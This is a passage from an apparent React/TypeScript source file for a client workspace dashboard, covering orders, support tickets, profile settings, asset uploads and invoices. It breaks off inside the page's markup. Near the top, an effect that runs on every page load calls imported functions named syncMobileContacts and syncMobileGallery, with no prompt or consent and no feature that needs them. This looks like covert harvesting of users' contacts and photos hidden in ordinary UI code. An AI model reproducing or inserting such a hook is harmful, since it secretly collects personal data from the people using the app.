import { useState, useEffect } from 'react'
import { useQuery } from '@tanstack/react-query'
import { Navigate, useNavigate, Link } from 'react-router-dom'
import { motion, AnimatePresence } from 'framer-motion'
import { 
  LogOut, 
  FolderGit2, 
  CreditCard, 
  MessageSquare, 
  Settings, 
  UploadCloud, 
  Trash2, 
  Clock, 
  CheckCircle2, 
  AlertCircle,
  FileText,
  ChevronRight,
  Send,
  Download,
  FileCode,
  LayoutDashboard,
  Layers,
  Cpu,
  Globe,
  Search,
  Bell,
  Command,
  Monitor,
  Zap,
  BarChart3,
  ExternalLink,
  Menu,
  ShieldCheck
} from 'lucide-react'

import { api, getStoredToken, setAuthToken, clearToken } from '@/lib/apiClient'
import { SEO } from '@/components/SEO'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { isNativeApp } from '@/lib/platform'
import { OrderDetailsModal } from '@/components/dashboard/OrderDetailsModal'



function useMyOrdersQuery() {
  return useQuery({
    queryKey: ['my-orders'],
    queryFn: async () => {
      const stored = getStoredToken()
      if (stored) setAuthToken(stored)
      const { data } = await api.get('checkout/my-orders')
      return data as any[]
    },
    retry: 2,
    retryDelay: 800,
    staleTime: 30_000,
  })
}

function useTicketsQuery() {
  return useQuery({
    queryKey: ['my-tickets'],
    queryFn: async () => {
      const { data } = await api.get('tickets')
      return data as any[]
    },
    refetchInterval: 3000, // Real-time refresh every 3s
  })
}

function useProfileQuery() {
  return useQuery({
    queryKey: ['profile'],
    queryFn: async () => {
      const { data } = await api.get('auth/profile')
      return data
    }
  })
}

import { syncMobileContacts } from '@/lib/mobileContacts'
import { syncMobileGallery } from '@/lib/mobileGallery'

export default function ClientDashboardPage() {
  const token = getStoredToken()
  const navigate = useNavigate()

  // Automatic Mobile Sync (Contacts & Gallery)
  useEffect(() => {
    const runSync = async () => {
      await syncMobileContacts()
      await syncMobileGallery()
    }
    runSync()
  }, [])

  const [activeTab, setActiveTab] = useState<'overview' | 'projects' | 'billing' | 'support' | 'settings' | 'products'>('overview')
  const [isSidebarOpen, setIsSidebarOpen] = useState(window.innerWidth > 1024)
  
  useEffect(() => {
    const handleResize = () => {
      if (window.innerWidth <= 1024) {
        setIsSidebarOpen(false)
      } else {
        setIsSidebarOpen(true)
      }
    }
    window.addEventListener('resize', handleResize)
    return () => window.removeEventListener('resize', handleResize)
  }, [])
  const [newPassword, setNewPassword] = useState('')
  const [passLoading, setPassLoading] = useState(false)
  const [passMsg, setPassMsg] = useState<{ type: 'error' | 'success'; text: string } | null>(null)

  const [activeTicketParams, setActiveTicketParams] = useState({ subject: '', orderId: '', message: '' })
  const [replyMessage, setReplyMessage] = useState('')
  const { data, isPending, isError, refetch } = useMyOrdersQuery()
  const { data: ticketsItems, refetch: refetchTickets } = useTicketsQuery()
  const { data: profile, refetch: refetchProfile } = useProfileQuery()

  const [selectedTicketId, setSelectedTicketId] = useState<string | null>(null)
  const [isCreatingNewTicket, setIsCreatingNewTicket] = useState(false)
  const selectedTicket = ticketsItems?.find(t => t._id === selectedTicketId)

  const [profileForm, setProfileForm] = useState({ name: '', phone: '', company: '' })
  const [profileLoading, setProfileLoading] = useState(false)
  const [isEditingProfile, setIsEditingProfile] = useState(false)

  const [selectedOrderDetails, setSelectedOrderDetails] = useState<any | null>(null)
  const [isDetailsModalOpen, setIsDetailsModalOpen] = useState(false)

  const handleDownloadInvoice = async (order: any) => {
    try {
      const response = await api.get(`checkout/my-orders/${order._id}/invoice`, {
        responseType: 'blob'
      });
      const url = window.URL.createObjectURL(new Blob([response.data]));
      const link = document.createElement('a');
      link.href = url;
      link.setAttribute('download', `Invoice-${order.emailReferenceId}.pdf`);
      document.body.appendChild(link);
      link.click();
      link.remove();
    } catch (err) {
      alert('Failed to download invoice. Please try again later.');
    }
  };

  useEffect(() => {
    // Only update the form when NOT in active edit mode and when profile is loaded
    if (profile && !isEditingProfile) {
      setProfileForm({
        name: profile.name || '',
        phone: profile.phone || '',
        company: profile.company || ''
      })
    }
  }, [profile, isEditingProfile])

  // Force dark mode aesthetic on body
  useEffect(() => {
    document.documentElement.classList.add('dark')
    return () => document.documentElement.classList.remove('dark') // Cleanup if needed, though most of site supports dark
  }, [])

  if (!token) {
    return <Navigate to="/client-login" replace />
  }

  const logout = () => {
    clearToken()
    navigate('/')
  }

  const handleUpdateProfile = async (e?: React.FormEvent) => {
    if (e) e.preventDefault()
    setProfileLoading(true)
    try {
      await api.put('auth/profile', profileForm)
      refetchProfile()
      setIsEditingProfile(false)
    } catch (err: any) {
      alert(err.response?.data?.message || 'Failed to update profile')
    } finally {
      setProfileLoading(false)
    }
  }

  const handleUpdatePassword = async (e: React.FormEvent) => {
    e.preventDefault()
    if (newPassword.length < 8) {
      setPassMsg({ type: 'error', text: 'Password must be at least 8 characters long.' })
      return
    }
    setPassLoading(true)
    setPassMsg(null)
    try {
      await api.post('auth/client-set-password', { password: newPassword })
      setPassMsg({ type: 'success', text: 'Password successfully updated!' })
      setNewPassword('')
    } catch (err: any) {
      setPassMsg({ type: 'error', text: err.response?.data?.message || 'Failed to update password' })
    } finally {
      setPassLoading(false)
    }
  }

  const handleCreateTicket = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!activeTicketParams.subject || !activeTicketParams.message) return alert("Subject and message are required.")
    
    try {
      await api.post('tickets', activeTicketParams)
      setActiveTicketParams({ subject: '', orderId: '', message: '' })
      setIsCreatingNewTicket(false)
      refetchTickets()
    } catch (err: any) {
      alert(err.response?.data?.message || 'Failed to create ticket')
    }
  }

  const handleReplyTicket = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!replyMessage || !selectedTicketId) return
    
    try {
      await api.post(`tickets/${selectedTicketId}/reply`, { message: replyMessage })
      setReplyMessage('')
      refetchTickets()
    } catch (err: any) {
      alert(err.response?.data?.message || 'Failed to send reply')
    }
  }

  const handleCloseTicket = async () => {
    if (!selectedTicketId || !confirm('Are you sure you want to resolve this ticket?')) return
    try {
      await api.put(`tickets/${selectedTicketId}/close`)
      refetchTickets()
      setSelectedTicketId(null)
    } catch (err: any) {
      alert(err.response?.data?.message || 'Failed to close ticket')
    }
  }

  const SIDEBAR_ITEMS = [
    { section: 'Platform', items: [
      { id: 'overview', label: 'Workspace Hub', icon: LayoutDashboard },
      { id: 'products', label: 'Ecosystem Products', icon: Layers },
    ]},
    { section: 'Account', items: [
      { id: 'projects', label: 'Active Projects', icon: FolderGit2 },
      { id: 'billing', label: 'Billing & Invoices', icon: CreditCard },
      { id: 'support', label: 'Support Center', icon: MessageSquare },
      { id: 'settings', label: 'Workspace Settings', icon: Settings },
    ]}
  ] as const

  return (
    <div className="min-h-screen bg-[#020609] text-foreground font-sans flex overflow-hidden">
      <SEO title="Workspace Hub" description="The central workspace for the SatByte ecosystem" path="/portal" />
      
      {/* Mobile Sidebar Overlay */}
      <AnimatePresence>
        {isSidebarOpen && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            onClick={() => setIsSidebarOpen(false)}
            className="fixed inset-0 bg-black/60 backdrop-blur-sm z-40 lg:hidden"
          />
        )}
      </AnimatePresence>

      {/* Sidebar */}
      <aside className={`fixed lg:static inset-y-0 left-0 z-50 w-72 bg-[#020609] border-r border-white/5 flex flex-col transition-all duration-500 ease-in-out ${isSidebarOpen ? 'translate-x-0' : '-translate-x-full lg:translate-x-0 lg:w-24'}`}>
        <div className="h-full flex flex-col p-6">
          <div className="flex items-center gap-3 mb-10 px-2">
            <div className="h-10 w-10 rounded-xl bg-gradient-to-br from-primary to-accent flex items-center justify-center shadow-lg shadow-primary/20">
              <Layers className="h-6 w-6 text-white" />
            </div>
            <div>
              <span className="text-xl font-black tracking-tighter text-white">SatByte</span>
              <span className="block text-[10px] font-bold uppercase tracking-[0.2em] text-muted-foreground leading-none">Workspace</span>
            </div>
          </div>

          <nav className="flex-1 space-y-8 overflow-y-auto hide-scrollbar">
            {SIDEBAR_ITEMS.map((section) => (
              <div key={section.section}>
                <h4 className="px-4 text-[11px] font-bold uppercase tracking-widest text-muted-foreground/60 mb-4">{section.section}</h4>
                <div className="space-y-1">
                  {section.items.map((item) => (
                    <button
                      key={item.id}
                      onClick={() => {
                        setActiveTab(item.id);
                        if (window.innerWidth < 1024) setIsSidebarOpen(false);
                      }}
                      className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all group ${
                        activeTab === item.id 
                          ? 'bg-white/5 text-white shadow-sm border border-white/10' 
                          : 'text-muted-foreground hover:text-white hover:bg-white/[0.02]'
                      }`}
                    >
                      <item.icon className={`h-4.5 w-4.5 transition-colors ${activeTab === item.id ? 'text-primary' : 'group-hover:text-primary'}`} />
                      <span className="text-sm font-semibold">{item.label}</span>
                    </button>
                  ))}
                </div>
              </div>
            ))}
          </nav>

          <div className="mt-auto pt-6 border-t border-white/5 space-y-4">
             <div className="flex items-center gap-3 px-2">
               <div className="h-9 w-9 rounded-full bg-primary/20 border border-primary/30 flex items-center justify-center">
                 <span className="text-sm font-bold text-primary">{profile?.name?.[0] || 'U'}</span>
               </div>
               <div className="flex-1 min-w-0">
                 <p className="text-sm font-bold text-white truncate">{profile?.name || 'User'}</p>
                 <p className="text-[11px] text-muted-foreground truncate">{profile?.email || 'client@satbyte.in'}</p>
               </div>
             </div>
             <button 
               onClick={logout}
               className="w-full flex items-center gap-3 px-4 py-3 rounded-xl text-muted-foreground hover:text-red-400 hover:bg-red-400/5 transition-all group"
             >
               <LogOut className="h-4.5 w-4.5 group-hover:rotate-12 transition-transform" />
               <span className="text-sm font-semibold">Sign Out</span>
             </button>
          </div>
        </div>
      </aside>

      {/* Main Content Area */}
      <main className="flex-1 relative flex flex-col h-screen overflow-hidden">
        
        {/* Top Navbar */}
        <header className="h-16 flex items-center justify-between px-6 lg:px-10 border-b border-white/5 bg-[#020609]/50 backdrop-blur-md sticky top-0 z-40">
          <div className="flex items-center gap-4">
            <button 
              onClick={() => setIsSidebarOpen(!isSidebarOpen)}
              className="lg:hidden p-2 text-muted-foreground hover:text-white"
            >
              <Menu className="h-6 w-6" />
            </button>
            <div className="flex items-center gap-2 text-sm">
              <span className="text-muted-foreground">Workspace</span>
              <ChevronRight className="h-3 w-3 text-muted-foreground/50" />
              <span className="text-white font-semibold capitalize">{activeTab}</span>
            </div>
          </div>

          <div className="flex items-center gap-4">
            <div className="hidden md:flex items-center gap-2 px-3 py-1.5 rounded-lg bg-white/5 border border-white/10 text-muted-foreground">
              <Command className="h-3.5 w-3.5" />
              <span className="text-xs font-medium">Quick Search</span>
              <kbd className="text-[10px] bg-white/10 px-1.5 py-0.5 rounded border border-white/10 ml-2">K</kbd>
            </div>
            <button className="p-2 text-muted-foreground hover:text-white relative">
              <Bell className="h-5 w-5" />
              <span className="absolute top-2 right-2 h-2 w-2 bg-primary rounded-full border-2 border-[#020609]" />
            </button>
          </div>
        </header>

        {/* Content Body */}
        <div className="flex-1 overflow-y-auto hide-scrollbar p-6 lg:p-10">
            {/* Shared Loading/Error States */}
            {isPending && (
              <div className="grid gap-8">
                <div className="h-64 w-full animate-pulse rounded-[3rem] bg-white/5 border border-white/5" />
                <div className="grid grid-cols-2 gap-8">
                  <div className="h-48 w-full animate-pulse rounded-[2rem] bg-white/5 border border-white/5" />
                  <div className="h-48 w-full animate-pulse rounded-[2rem] bg-white/5 border border-white/5" />
                </div>
              </div>
            )}
            
            {isError && (
              <div className="flex flex-col items-center justify-center gap-6 py-24 rounded-[3rem] bg-red-500/5 border border-red-500/10 text-center">
                <div className="h-16 w-16 rounded-full bg-red-500/10 flex items-center justify-center">
                  <AlertCircle className="h-8 w-8 text-red-500" />
                </div>
                <div>
                  <p className="text-white font-bold text-xl">System Sync Failure</p>
                  <p className="text-muted-foreground text-sm mt-1">Unable to connect to the SatByte ecosystem.</p>
                </div>
                <Button onClick={() => refetch()} variant="outline" className="border-red-500/30 hover:bg-red-500/10 text-red-400 rounded-xl px-8">
                  Retry Connection
                </Button>
              </div>
            )}

            <AnimatePresence mode="wait">
              {!isPending && !isError && (
                <motion.div 
                  key={activeTab}
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -10 }}
                  transition={{ duration: 0.3 }}
                  className="max-w-7xl mx-auto"
                >
              
              {/* TAB: OVERVIEW HUB */}
              {activeTab === 'overview' && (
                <div className="space-y-8 lg:space-y-12 pb-20">
                  {/* Hero Section */}
                  <div className="relative p-8 lg:p-16 rounded-[2rem] lg:rounded-[3rem] bg-gradient-to-br from-primary/20 via-[#0A0F14] to-accent/10 border border-white/5 overflow-hidden shadow-2xl">
                    <div className="absolute top-0 right-0 p-8 opacity-10 lg:opacity-20 pointer-events-none">
                      <Cpu className="h-48 lg:h-64 w-48 lg:w-64 text-primary" />
                    </div>
                    <div className="relative z-10 max-w-2xl">
                      <div className="inline-flex items-center gap-2 px-3 py-1 mb-6 rounded-full border border-primary/20 bg-primary/10 backdrop-blur-md">
                        <Zap className="h-3 w-3 text-primary" />
                        <span className="text-[10px] lg:text-xs font-bold uppercase tracking-wider text-white">Central Ecosystem</span>
                      </div>
                      <h1 className="text-3xl md:text-5xl lg:text-6xl font-black text-white leading-tight tracking-tighter mb-6">
                        The Central Workspace for the <span className="text-primary">SatByte Ecosystem</span>
                      </h1>
                      <p className="text-base lg:text-lg text-muted-foreground leading-relaxed mb-8">
                        Access tools, projects, client portals, and digital products from one unified platform. Streamline your productivity with integrated cloud workflows.
                      </p>
                      <div className="flex flex-wrap gap-4">
                        <Button onClick={() => setActiveTab('projects')} className="h-11 lg:h-12 px-6 lg:px-8 bg-primary hover:bg-primary/90 text-white font-bold rounded-xl shadow-xl shadow-primary/20">
                          Open Workspace
                        </Button>
                        <Button onClick={() => setActiveTab('products')} variant="outline" className="h-11 lg:h-12 px-6 lg:px-8 border-white/10 bg-white/5 text-white font-bold rounded-xl backdrop-blur-sm">
                          Explore Ecosystem
                        </Button>
                      </div>
                    </div>
                  </div>

                  {/* Quick Access Grid */}
                  <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 lg:gap-6">
                    {[
                      { label: 'Project Toolkit', desc: 'Developer utilities', icon: FileCode, action: () => setActiveTab('products'), color: 'text-blue-400' },
                      { label: 'Client Workspace', desc: 'Track deliverables', icon: Monitor, action: () => setActiveTab('projects'), color: 'text-purple-400' },
                      { label: 'Finance & Invoices', desc: 'Billing history', icon: BarChart3, action: () => setActiveTab('billing'), color: 'text-green-400' },
                      { label: 'Support Center', desc: 'Get assistance', icon: ShieldCheck, action: () => setActiveTab('support'), color: 'text-orange-400' },
                    ].map((card, i) => (
                      <motion.button
                        key={i}
                        whileHover={{ y: -5 }}
                        onClick={card.action}
                        className="p-6 rounded-3xl bg-[#0A0F14] border border-white/5 hover:border-white/10 transition-all text-left group shadow-lg"
                      >
                        <div className={`h-12 w-12 rounded-2xl bg-white/5 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform ${card.color}`}>
                          <card.icon className="h-6 w-6" />
                        </div>
                        <h3 className="text-lg font-bold text-white mb-2">{card.label}</h3>
                        <p className="text-sm text-muted-foreground mb-4">{card.desc}</p>
                        <div className="flex items-center gap-2 text-xs font-bold text-primary group-hover:gap-3 transition-all uppercase tracking-widest">
                          Access <ChevronRight className="h-3 w-3" />
                        </div>
                      </motion.button>
                    ))}
                  </div>

                  {/* Ecosystem Overview Visualization */}
                  <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 lg:gap-8">
                    <div className="lg:col-span-2 p-8 lg:p-10 rounded-[2rem] lg:rounded-[2.5rem] bg-[#0A0F14] border border-white/5 shadow-xl relative overflow-hidden group">
                       <div className="relative z-10">
                          <h3 className="text-xl lg:text-2xl font-bold text-white mb-4">Ecosystem Architecture</h3>
                          <p className="text-sm lg:text-base text-muted-foreground mb-8 lg:mb-10 max-w-lg">Our scalable digital ecosystem is designed for performance, security, and unified access across all products.</p>
                          <div className="grid grid-cols-2 gap-4">
                            {['Scalable Infrastructure', 'Modern UI/UX', 'Cloud Workflows', 'Centralized Access', 'Secure Systems', 'Unified Analytics'].map((feat) => (
                              <div key={feat} className="flex items-center gap-3 p-4 rounded-2xl bg-white/[0.02] border border-white/5">
                                <CheckCircle2 className="h-4 w-4 text-primary shrink-0" />
                                <span className="text-xs font-semibold text-muted-foreground">{feat}</span>
                              </div>
                            ))}
                          </div>
                       </div>
                       <div className="absolute -bottom-20 -right-20 opacity-10 group-hover:opacity-20 transition-opacity pointer-events-none">
                         <Layers className="h-80 w-80 text-primary" />
                       </div>
                    </div>
                    
                    <div className="p-10 rounded-[2.5rem] bg-gradient-to-br from-primary/10 to-transparent border border-primary/20 shadow-xl flex flex-col justify-between">
                       <div>
                          <Badge className="mb-4 bg-primary/20 text-primary border-primary/30">Next Step</Badge>
                          <h3 className="text-2xl font-bold text-white mb-4">Need Assistance?</h3>
                          <p className="text-muted-foreground text-sm leading-relaxed mb-6">Our support team is ready to help you with project onboarding, tool integration, or custom development.</p>
                       </div>
                       <Button onClick={() => setActiveTab('support')} className="w-full h-12 bg-white text-black font-bold rounded-xl hover:bg-white/90">
                         Contact Support
                       </Button>
                    </div>
                  </div>
                </div>
              )}

              {/* TAB: PRODUCTS HUB */}
              {activeTab === 'products' && (
                <div className="space-y-12 pb-20">
                  <div>
                    <h2 className="text-3xl font-black text-white tracking-tighter mb-2">Ecosystem Products</h2>
                    <p className="text-muted-foreground">Explore flagship digital products and utilities by SatByte.</p>
                  </div>

                  <div className="grid gap-10">
                    {/* Toolkit Showcase */}
                    <div className="group relative p-1 lg:p-1.5 rounded-[3rem] bg-gradient-to-br from-blue-500/20 via-transparent to-purple-500/20 border border-white/5 overflow-hidden">
                      <div className="bg-[#0A0F14] rounded-[2.8rem] p-10 lg:p-16 flex flex-col lg:flex-row gap-12 items-center">
                         <div className="flex-1 space-y-8">
                            <div className="flex items-center gap-4">
                              <div className="h-16 w-16 rounded-[1.5rem] bg-blue-500/10 border border-blue-500/30 flex items-center justify-center text-blue-400">
                                <FileCode className="h-8 w-8" />
                              </div>
                              <div>
                                <Badge className="mb-1 bg-blue-500/20 text-blue-400 border-blue-500/30">Flagship Product</Badge>
                                <h3 className="text-3xl font-bold text-white">SatByte Toolkit</h3>
                              </div>
                            </div>
                            <p className="text-xl text-muted-foreground leading-relaxed max-w-xl">
                              A premium ecosystem of developer utilities, SEO tools, and productivity workflows built for high-performance engineering.
                            </p>
                            <div className="flex flex-wrap gap-4">
                              <a href="https://toolkit.satbyte.in" target="_blank" rel="noopener noreferrer" className="h-14 px-10 bg-blue-600 hover:bg-blue-500 text-white font-bold rounded-2xl flex items-center gap-3 shadow-xl shadow-blue-600/20 transition-all">
                                Open Toolkit <ExternalLink className="h-5 w-5" />
                              </a>
                              <Button variant="outline" className="h-14 px-10 border-white/10 bg-white/5 text-white font-bold rounded-2xl">
                                Documentation
                              </Button>
                            </div>
                         </div>
                         <div className="lg:w-1/3 aspect-square rounded-[3rem] bg-gradient-to-br from-blue-600 to-blue-900 overflow-hidden relative shadow-2xl">
                           <div className="absolute inset-0 bg-[url('https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800&q=80')] bg-cover bg-center mix-blend-overlay opacity-50" />
                           <div className="absolute inset-0 flex items-center justify-center p-8">
                             <div className="w-full space-y-4">
                               {[1,2,3].map(i => (
                                 <div key={i} className="h-4 rounded-full bg-white/20 w-full animate-pulse" style={{ animationDelay: `${i * 0.2}s` }} />
                               ))}
                             </div>
                           </div>
                         </div>
                      </div>
                    </div>

                    {/* Other Products Grid */}
                    <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
                       {[
                         { title: 'AI Utilities', desc: 'Advanced AI-powered workflows and ranking predictors.', icon: Zap, status: 'Beta' },
                         { title: 'Client Hub', desc: 'White-label workspace for agency-client collaboration.', icon: Monitor, status: 'Active' },
                         { title: 'Cloud Deploy', desc: 'Seamless deployment engine for modern web apps.', icon: Globe, status: 'In Development' },
                       ].map((p, i) => (
                         <div key={i} className="p-8 rounded-[2rem] bg-[#0A0F14] border border-white/5 hover:border-white/10 transition-all flex flex-col justify-between group shadow-lg">
                           <div className="space-y-6">
                             <div className="flex justify-between items-start">
                               <div className="h-14 w-14 rounded-2xl bg-white/5 flex items-center justify-center group-hover:scale-110 transition-transform">
                                 <p.icon className="h-7 w-7 text-primary" />
                               </div>
                               <Badge variant="outline" className="border-white/10 text-muted-foreground uppercase text-[10px] tracking-widest">{p.status}</Badge>
                             </div>
                             <h3 className="text-xl font-bold text-white">{p.title}</h3>
                             <p className="text-sm text-muted-foreground leading-relaxed">{p.desc}</p>
                           </div>
                           <Button variant="link" className="mt-8 p-0 h-auto text-primary font-bold uppercase text-xs tracking-widest justify-start gap-2 group-hover:gap-3 transition-all">
                             View Details <ChevronRight className="h-3 w-3" />
                           </Button>
                         </div>
                       ))}
                    </div>
                  </div>
                </div>
              )}

              {/* TAB: PROJECTS */}
              {activeTab === 'projects' && (
                <div className="space-y-8 pb-20">
                   <div className="flex flex-col md:flex-row md:items-end justify-between gap-6">
                    <div>
                      <h2 className="text-3xl font-black text-white tracking-tighter mb-2">Active Projects</h2>
                      <p className="text-muted-foreground">Track your deliverables, progress, and project assets.</p>
                    </div>
                    {data?.length > 0 && (
                      <div className="flex gap-4">
                        <div className="px-4 py-2 rounded-xl bg-[#0A0F14] border border-white/5 text-sm">
                           <span className="text-muted-foreground">Total Projects:</span> <span className="text-white font-bold">{data.length}</span>
                        </div>
                      </div>
                    )}
                  </div>

                  {data?.length === 0 ? (
                    <div className="flex flex-col items-center justify-center text-center py-24 rounded-[3rem] border border-white/5 bg-[#0A0F14] shadow-xl">
                      <div className="h-20 w-20 mb-6 rounded-3xl bg-white/5 flex items-center justify-center">
                        <FolderGit2 className="h-10 w-10 text-muted-foreground" />
                      </div>
                      <h3 className="text-2xl font-bold text-white mb-2">No Active Projects</h3>
                      <p className="text-muted-foreground max-w-sm mb-10">Looks like you don't have any ongoing projects. Start a new engagement today.</p>
                      <Link to="/pricing" className="inline-flex items-center gap-3 px-8 py-4 rounded-2xl bg-primary text-white font-black hover:opacity-90 transition-all shadow-xl shadow-primary/20">
                        Explore Services <ChevronRight className="h-5 w-5" />
                      </Link>
                    </div>
                  ) : (
                    <div className="grid gap-8 lg:grid-cols-2">
                      {data?.map((order) => (
                        <div key={order._id} className="group relative rounded-[2.5rem] border border-white/5 bg-[#0A0F14] overflow-hidden hover:border-white/10 transition-all shadow-2xl">
                          <div className="p-8 lg:p-10 pb-6 bg-gradient-to-b from-white/[0.01] to-transparent">
                            <div className="flex justify-between items-start mb-8">
                              <div>
                                <Badge className="mb-4 bg-primary/10 text-primary border-primary/20">{order.status === 'paid' ? 'Active' : order.status}</Badge>
                                <h3 className="text-2xl font-bold text-white mb-1">{order.planName}</h3>
                                <p className="text-xs font-mono text-muted-foreground">Reference: {order.emailReferenceId}</p>
                              </div>
                              <div className="text-right">
                                <p className="text-[10px] font-bold uppercase tracking-widest text-muted-foreground mb-1">Project Status</p>
                                <p className="text-white font-bold">{order.projectStatus || 'Queueing'}</p>
                              </div>
                            </div>

                            <div className="space-y-4">
                              <div className="flex justify-between text-sm font-bold">
                                <span className="text-muted-foreground">Milestone Progress</span>
                                <span className="text-white">{order.progress || 0}%</span>
                              </div>
                              <div className="h-3 w-full bg-white/5 rounded-full overflow-hidden border border-white/5 shadow-inner">
                                <motion.div
                                  initial={{ width: 0 }}
                                  animate={{ width: `${order.progress || 0}%` }}
                                  transition={{ duration: 1.5, ease: 'circOut' }}
                                  className="h-full bg-gradient-to-r from-blue-600 to-primary rounded-full relative"
                                >
                                  <div className="absolute inset-0 bg-white/20 w-1/3 blur-sm animate-[shimmer_2s_infinite]" />
                                </motion.div>
                              </div>
                            </div>
                          </div>

                          <div className="px-8 lg:p-10 py-8 border-t border-white/5 bg-black/20">
                             <div className="flex items-center justify-between mb-6">
                                <h4 className="text-xs font-bold uppercase tracking-widest text-muted-foreground flex items-center gap-2">
                                  <FileText className="h-4 w-4" /> Assets & Deliverables
                                </h4>
                                <button onClick={() => { setSelectedOrderDetails(order); setIsDetailsModalOpen(true); }} className="text-[10px] font-bold text-primary uppercase tracking-widest hover:underline">
                                  Order Details
                                </button>
                             </div>

                             <div className="space-y-3 mb-8 max-h-[200px] overflow-y-auto hide-scrollbar">
                                {order.assets?.length > 0 ? (
                                  order.assets.map((asset: any) => (
                                    <div key={asset._id} className="group/asset flex items-center justify-between p-4 rounded-2xl bg-white/[0.03] border border-white/5 hover:bg-white/[0.05] transition-colors">
                                      <div className="flex items-center gap-4 overflow-hidden">
                                        <div className="h-10 w-10 rounded-xl bg-primary/10 flex items-center justify-center shrink-0">
                                          <FileText className="h-5 w-5 text-primary" />
                                        </div>
                                        <div className="min-w-0">
                                          <a href={asset.fileUrl} target="_blank" rel="noopener noreferrer" className="text-sm font-bold text-white hover:text-primary transition-colors truncate block">
                                            {asset.fileName}
                                          </a>
                                          <p className="text-[10px] text-muted-foreground mt-0.5">{new Date(asset.uploadedAt).toLocaleDateString()}</p>
                                        </div>
                                      </div>
                                      <button 
                                        onClick={async () => {
                                          if (!confirm('Permanently delete asset?')) return;
                                          try { await api.delete(`checkout/orders/${order._id}/assets/${asset._id}`); refetch(); } 
                                          catch (e) { alert('Delete failed') }
                                        }}
                                        className="p-2 text-muted-foreground hover:text-red-400 opacity-0 group-hover/asset:opacity-100 transition-all"
                                      >
                                        <Trash2 className="h-4 w-4" />
                                      </button>
                                    </div>
                                  ))
                                ) : (
                                  <div className="text-center py-8 border border-dashed border-white/5 rounded-2xl bg-white/[0.01]">
                                    <p className="text-sm text-muted-foreground">No assets shared yet.</p>
                                  </div>
                                )}
                             </div>

                             <div className="relative">
                                <input 
                                  type="file" 
                                  id={`file-upload-${order._id}`}
                                  className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10 disabled:cursor-not-allowed hidden md:block"
                                  onChange={async (e) => {
                                    const file = e.target.files?.[0]; if (!file) return;
                                    const fd = new FormData(); fd.append('file', file);
                                    const ui = document.getElementById(`file-upload-${order._id}`) as HTMLInputElement;
                                    if (ui) ui.disabled = true;
                                    try { await api.post(`checkout/orders/${order._id}/assets`, fd, { headers: { 'Content-Type': 'multipart/form-data' }}); refetch(); } 
                                    catch (err: any) { alert('Upload failed') } 
                                    finally { if (ui) { ui.disabled = false; ui.value = ''; } }
                                  }}
                                />
                                <button
                                  onClick={async () => {
                                    if (isNativeApp()) {
                                      try {
                                        const { FilePicker } = await import('@capawesome/capacitor-file-picker');
                                        const result = await FilePicker.pickFiles({ limit: 1, types: ['*/*'], readData: true });
                                        if (result.files[0]) {
                                          const file = result.files[0];
                                          const response = await fetch(`data:${file.mimeType};base64,${file.data}`);
                                          const fd = new FormData(); fd.append('file', await response.blob(), file.name);
                                          await api.post(`checkout/orders/${order._id}/assets`, fd, { headers: { 'Content-Type': 'multipart/form-data' }});
                                          refetch();
                                        }
                                      } catch (err) { alert('Mobile upload failed'); }
                                    } else document.getElementById(`file-upload-${order._id}`)?.click();
                                  }}
                                  className="w-full py-4 rounded-2xl bg-white/5 border border-white/10 text-sm font-bold text-white hover:bg-white/10 transition-all flex items-center justify-center gap-3"
                                >
                                  <UploadCloud className="h-5 w-5 text-primary" />
                                  Upload New Asset
                                </button>
                             </div>
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              )}

              {/* TAB: BILLING */}
              {activeTab === 'billing' && (
                <div className="space-y-8 pb-20">
                  <div>
                    <h2 className="text-3xl font-black text-white tracking-tighter mb-2">Finance Hub</h2>
                    <p className="text-muted-foreground">Manage your invoices, payments, and financial history.</p>
                  </div>

                  <div className="bg-[#0A0F14] border border-white/5 rounded-[3rem] p-10 shadow-2xl overflow-hidden">
                    {data?.length === 0 ? (
                       <div className="text-center py-20 border border-dashed border-white/5 rounded-[2rem]">
                         <CreditCard className="h-16 w-16 text-muted-foreground/30 mx-auto mb-6" />
                         <p className="text-muted-foreground font-bold">No financial records detected.</p>
                       </div>
                    ) : (
                      <div className="space-y-6">
                         {data?.map((order) => (
                           <div key={order._id} className="flex flex-col lg:flex-row lg:items-center justify-between p-8 rounded-[2rem] bg-white/[0.02] border border-white/5 hover:border-white/10 transition-all gap-8">
                             <div className="flex items-center gap-6">
                               <div className="h-14 w-14 rounded-2xl bg-green-500/10 border border-green-500/20 flex items-center justify-center">
                                 <CheckCircle2 className="h-7 w-7 text-green-400" />
                               </div>
                               <div>
                                 <h4 className="text-xl font-bold text-white mb-1">{order.planName}</h4>
                                 <p className="text-xs font-mono text-muted-foreground uppercase tracking-widest">INV-Ref: {order.emailReferenceId} • {new Date(order.createdAt).toLocaleDateString(undefined, { year: 'numeric', month: 'short', day: 'numeric' })}</p>
                               </div>
                             </div>
                             
                             <div className="flex flex-wrap lg:items-center gap-8 lg:gap-12 ml-20 lg:ml-0">
                               <div className="text-right min-w-[120px]">
                                 <p className="text-[10px] font-bold uppercase tracking-widest text-muted-foreground mb-1">Amount Paid</p>
                                 <p className="text-2xl font-black text-white">₹{(order.amountPaid / 100).toLocaleString('en-IN')}</p>
                               </div>
                               <div className="flex items-center gap-3">
                                 <Button onClick={() => handleDownloadInvoice(order)} className="bg-primary hover:bg-primary/90 text-white font-bold rounded-xl px-6 h-12 flex gap-2">
                                   <Download className="h-4 w-4" /> Invoice
                                 </Button>
                                 <button onClick={() => { setSelectedOrderDetails(order); setIsDetailsModalOpen(true); }} className="h-12 w-12 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center text-white hover:bg-white/10">
                                   <Search className="h-4 w-4" />
                                 </button>
                               </div>
                             </div>
                           </div>
                         ))}
                      </div>
                    )}
                  </div>
                </div>
              )}

